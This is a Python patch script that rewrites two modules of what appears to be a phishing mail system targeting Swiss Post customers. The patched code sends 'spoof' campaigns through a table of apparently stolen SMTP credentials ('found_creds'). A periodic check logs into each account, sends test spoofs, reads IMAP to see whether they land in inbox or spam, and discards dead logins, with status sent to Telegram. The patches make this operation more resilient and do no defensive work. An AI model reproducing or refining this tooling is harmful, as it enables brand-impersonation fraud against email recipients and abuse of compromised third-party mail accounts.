#!/usr/bin/env python3
"""
FINAL PATCH — all fixes in one clean pass.
Targets: campaign_sender.py + sender_bot.py (from .bak3 originals)

Fixes:
1. campaign_sender.py: robust DB handling (timeout, retries, reconnect, reset_orphan)
2. sender_bot.py:
   a. Global _CAMPAIGN_ACTIVE flag set by _run_swisspost_campaign
   b. Health check skips when _CAMPAIGN_ACTIVE is True
   c. Health check uses asyncio.to_thread for blocking calls
   d. Campaign loop: try/except FATAL + always update status
   e. Reset orphan sending on campaign start
   f. Better DB lock retry with reconnect
"""

import re

# ================================================================
# PATCH campaign_sender.py
# ================================================================
CS = "/opt/darkvasend/auditguard/campaign_sender.py"
with open(CS) as f:
    cs = f.read()

# 1. Store db_path + increase timeouts
cs = cs.replace(
    '    def __init__(self, db_path: str = DB_PATH):\n        self.db = sqlite3.connect(db_path, timeout=30, check_same_thread=False)',
    '    def __init__(self, db_path: str = DB_PATH):\n        self._db_path = db_path\n        self.db = sqlite3.connect(db_path, timeout=120, check_same_thread=False)'
)
cs = cs.replace('self.db.execute("PRAGMA busy_timeout=120000")', 'self.db.execute("PRAGMA busy_timeout=300000")')

# 2. Robust claim_recipient (30 retries + reconnect)
cs = cs.replace(
    '''    def claim_recipient(self, campaign_id: int) -> dict | None:
        """Claim next pending recipient. Retries aggressively on DB lock."""
        for _retry in range(10):
            try:
                with self.db:
                    row = self.db.execute(
                        "SELECT id, email FROM campaign_recipients WHERE campaign_id = ? AND status = 'pending' LIMIT 1",
                        (campaign_id,),
                    ).fetchone()
                    if row:
                        self.db.execute(
                            "UPDATE campaign_recipients SET status = 'sending' WHERE id = ?",
                            (row["id"],),
                        )
                        return dict(row)
                return None
            except Exception as e:
                if "locked" in str(e).lower() and _retry < 9:
                    wait = min(0.5 * (2 ** _retry), 10.0)  # Max 10s wait
                    time.sleep(wait)
                    continue
                raise
        return None''',
    '''    def claim_recipient(self, campaign_id: int) -> dict | None:
        """Claim next pending recipient. Resilient DB lock handling."""
        for _retry in range(30):
            try:
                with self.db:
                    row = self.db.execute(
                        "SELECT id, email FROM campaign_recipients WHERE campaign_id = ? AND status = 'pending' LIMIT 1",
                        (campaign_id,),
                    ).fetchone()
                    if row:
                        self.db.execute(
                            "UPDATE campaign_recipients SET status = 'sending' WHERE id = ?",
                            (row["id"],),
                        )
                        return dict(row)
                return None
            except Exception as e:
                if ("locked" in str(e).lower() or "busy" in str(e).lower()) and _retry < 29:
                    time.sleep(min(1.0 + 0.5 * _retry, 15.0))
                    if _retry > 0 and _retry % 10 == 0:
                        try:
                            self.db.close()
                        except Exception:
                            pass
                        self.db = sqlite3.connect(self._db_path, timeout=120, check_same_thread=False)
                        self.db.row_factory = sqlite3.Row
                        self.db.execute("PRAGMA journal_mode=WAL")
                        self.db.execute("PRAGMA busy_timeout=300000")
                    continue
                raise
        return None'''
)

# 3. More retries in mark_sent/mark_failed
cs = cs.replace(
    '    def mark_sent(self, recipient_id: int, smtp_info: str):\n        for _retry in range(5):',
    '    def mark_sent(self, recipient_id: int, smtp_info: str):\n        for _retry in range(15):'
)
cs = cs.replace(
    '    def mark_failed(self, recipient_id: int, error: str, smtp_info: str = ""):\n        for _retry in range(5):',
    '    def mark_failed(self, recipient_id: int, error: str, smtp_info: str = ""):\n        for _retry in range(15):'
)
# Fix retry bounds
cs = re.sub(
    r'if "locked" in str\(e\)\.lower\(\) and _retry < 4:\n\s+time\.sleep\(0\.3 \* \(2 \*\* _retry\)\)',
    'if "locked" in str(e).lower() and _retry < 14:\n                    time.sleep(min(0.5 * (2 ** min(_retry, 5)), 15.0))',
    cs
)

# 4. Add reset_orphan method
cs = cs.replace(
    '    def close(self):\n        self.db.close()',
    '''    def reset_orphan_sending(self, campaign_id: int) -> int:
        """Reset stuck sending recipients back to pending."""
        try:
            with self.db:
                cur = self.db.execute(
                    "UPDATE campaign_recipients SET status = 'pending' WHERE campaign_id = ? AND status = 'sending'",
                    (campaign_id,),
                )
                return cur.rowcount
        except Exception:
            return 0

    def close(self):
        self.db.close()'''
)

with open(CS, "w") as f:
    f.write(cs)
print("campaign_sender.py DONE")

# ================================================================
# PATCH sender_bot.py
# ================================================================
SB = "/opt/darkvasend/auditguard/sender_bot.py"
with open(SB) as f:
    sb = f.read()

# All busy_timeout to 300000
sb = sb.replace("busy_timeout=120000", "busy_timeout=300000")

# 1. Add _CAMPAIGN_ACTIVE flag before _run_swisspost_campaign
sb = sb.replace(
    'async def _run_swisspost_campaign(campaign_id, db_path, chat_id, mode="spoof"):',
    '_CAMPAIGN_ACTIVE = False\n\nasync def _run_swisspost_campaign(campaign_id, db_path, chat_id, mode="spoof"):'
)

# 2. Set flag at campaign start (after mgr.update_campaign_status running)
# Find the exact spot
sb = sb.replace(
    '    mgr.update_campaign_status(campaign_id, "running")\n\n    rate = camp["rate_per_minute"] or 30',
    '    mgr.update_campaign_status(campaign_id, "running")\n\n    global _CAMPAIGN_ACTIVE\n    _CAMPAIGN_ACTIVE = True\n\n    # Reset orphan sending from previous crash\n    try:\n        rc = mgr.reset_orphan_sending(campaign_id)\n        if rc:\n            print(f"[CAMP] Reset {rc} orphan sending -> pending", flush=True)\n    except Exception:\n        pass\n\n    rate = camp["rate_per_minute"] or 30'
)

# 3. Wrap the try/finally to catch FATAL errors and always clear flag
# Original pattern:
old_finally = '''    finally:
        executor.shutdown(wait=False)

    status = "finished" if not mgr.claim_recipient(campaign_id) else "stopped"
    mgr.update_campaign_status(campaign_id, status)'''

new_finally = '''    except Exception as _fatal:
        print(f"[CAMP] FATAL ERROR in campaign #{campaign_id}: {_fatal}", flush=True)
        import traceback
        traceback.print_exc()
        try:
            send_telegram("CAMP #" + str(campaign_id) + " ERREUR FATALE: " + str(_fatal)[:200], chat_id)
        except Exception:
            pass
    finally:
        try:
            executor.shutdown(wait=False)
        except Exception:
            pass
        _CAMPAIGN_ACTIVE = False

    try:
        status = "finished" if not mgr.claim_recipient(campaign_id) else "stopped"
    except Exception:
        status = "stopped"
    try:
        mgr.update_campaign_status(campaign_id, status)
    except Exception:
        pass'''

sb = sb.replace(old_finally, new_finally)

# 4. Improve the batch claim loop with better retry + reconnect
old_claim_block = '''            if not batch:
                # Double check: are there still pending recipients?
                try:
                    stats_check = mgr.get_stats(campaign_id)
                    if stats_check.pending == 0:
                        break
                    # There are pending but we couldn't claim — DB issue, wait and retry
                    print(f"[CAMP] No batch but {stats_check.pending} pending — waiting 5s...", flush=True)
                    await asyncio.sleep(5)
                    continue
                except Exception:
                    break'''

new_claim_block = '''            if not batch:
                try:
                    stats_check = mgr.get_stats(campaign_id)
                    if stats_check.pending == 0:
                        break
                    print(f"[CAMP] No batch but {stats_check.pending} pending — reconnecting DB, waiting 10s...", flush=True)
                    try:
                        mgr.close()
                    except Exception:
                        pass
                    mgr = CampaignManager(db_path)
                    await asyncio.sleep(10)
                    continue
                except Exception:
                    try:
                        mgr.close()
                    except Exception:
                        pass
                    mgr = CampaignManager(db_path)
                    await asyncio.sleep(10)
                    continue'''

sb = sb.replace(old_claim_block, new_claim_block)

# 5. Fix health check to skip when campaign active + use asyncio.to_thread
old_hc_start = '''async def _smtp_health_check_loop():
    """Every 3h: send FRESH spoof from each SMTP, check IMAP inbox/spam, update labels, kill deads."""
    import sqlite3 as _sql, uuid as _uuid, imaplib, ssl as _ssl
    while True:
        await asyncio.sleep(10800)  # 3 hours
        try:
            print("[IMAP CHECK] Starting fresh delivery classification...", flush=True)'''

new_hc_start = '''async def _smtp_health_check_loop():
    """Every 3h: send FRESH spoof from each SMTP, check IMAP inbox/spam, update labels, kill deads."""
    import sqlite3 as _sql, uuid as _uuid, imaplib, ssl as _ssl
    while True:
        await asyncio.sleep(10800)  # 3 hours
        try:
            if _CAMPAIGN_ACTIVE:
                print("[IMAP CHECK] SKIPPED — campaign is active", flush=True)
                continue
            print("[IMAP CHECK] Starting fresh delivery classification...", flush=True)'''

sb = sb.replace(old_hc_start, new_hc_start)

# 6. Wrap AUTH test + send_clean in health check with asyncio.to_thread
old_phase1 = '''            # Phase 1: AUTH check + send fresh spoof
            for r in rows:
                sid = r["id"]
                host, port = r["smtp_host"], r["smtp_port"]
                user, pwd = r["smtp_user"], r["smtp_password"]
                smtp_config = {
                    "host": host, "port": port,
                    "username": user, "password": pwd,
                    "from_email": user,
                }

                # AUTH test
                try:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    if port == 465:
                        srv = smtplib.SMTP_SSL(host, port, timeout=8, context=ctx)
                    else:
                        srv = smtplib.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=_ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    srv.quit()
                except smtplib.SMTPAuthenticationError:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead_ids.append(sid)
                    print(f"[IMAP CHECK] #{sid} {host} AUTH DEAD", flush=True)
                    continue
                except Exception:
                    continue

                # Send fresh spoof
                marker = f"{run_id}-{sid}"
                subject = f"{tpl['subject']} [{marker}]"
                result = send_clean(
                    smtp_config, tpl["from_name"], tpl["from_email"],
                    checker_email, subject, tpl["html"],
                    tpl.get("reply_to", ""), None,
                )
                if result["success"]:
                    markers[sid] = {"host": host, "marker": marker, "old_ctx": r["context"] or ""}
                await asyncio.sleep(0.3)'''

new_phase1 = '''            # Phase 1: AUTH check + send fresh spoof (NON-BLOCKING)
            def _hc_test_one(sid, host, port, user, pwd, run_id, tpl_data, checker_email, old_ctx):
                """Blocking AUTH + send — runs in thread to avoid freezing event loop."""
                import smtplib as _smtp2
                res = {"sid": sid, "host": host, "dead": False, "skip": False, "marker": None, "old_ctx": old_ctx}
                try:
                    _ctx = _ssl.create_default_context()
                    _ctx.check_hostname = False
                    _ctx.verify_mode = _ssl.CERT_NONE
                    if port == 465:
                        srv = _smtp2.SMTP_SSL(host, port, timeout=8, context=_ctx)
                    else:
                        srv = _smtp2.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=_ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    srv.quit()
                except _smtp2.SMTPAuthenticationError:
                    res["dead"] = True
                    return res
                except Exception:
                    res["skip"] = True
                    return res
                marker = f"{run_id}-{sid}"
                smtp_config = {"host": host, "port": port, "username": user, "password": pwd, "from_email": user}
                r = send_clean(smtp_config, tpl_data["from_name"], tpl_data["from_email"], checker_email, f"{tpl_data['subject']} [{marker}]", tpl_data["html"], tpl_data.get("reply_to", ""), None)
                if r["success"]:
                    res["marker"] = marker
                return res

            tpl_data = {"from_name": tpl["from_name"], "from_email": tpl["from_email"], "subject": tpl["subject"], "html": tpl["html"], "reply_to": tpl.get("reply_to", "")}
            for r in rows:
                if _CAMPAIGN_ACTIVE:
                    print("[IMAP CHECK] Campaign started — aborting", flush=True)
                    break
                sid = r["id"]
                host, port = r["smtp_host"], r["smtp_port"]
                user, pwd = r["smtp_user"], r["smtp_password"]
                hc_res = await asyncio.to_thread(_hc_test_one, sid, host, port, user, pwd, run_id, tpl_data, checker_email, r["context"] or "")
                if hc_res["dead"]:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead_ids.append(sid)
                    print(f"[IMAP CHECK] #{sid} {host} AUTH DEAD", flush=True)
                    continue
                if hc_res["skip"]:
                    continue
                if hc_res["marker"]:
                    markers[sid] = {"host": host, "marker": hc_res["marker"], "old_ctx": hc_res["old_ctx"]}
                await asyncio.sleep(0.3)'''

sb = sb.replace(old_phase1, new_phase1)

with open(SB, "w") as f:
    f.write(sb)
print("sender_bot.py DONE")
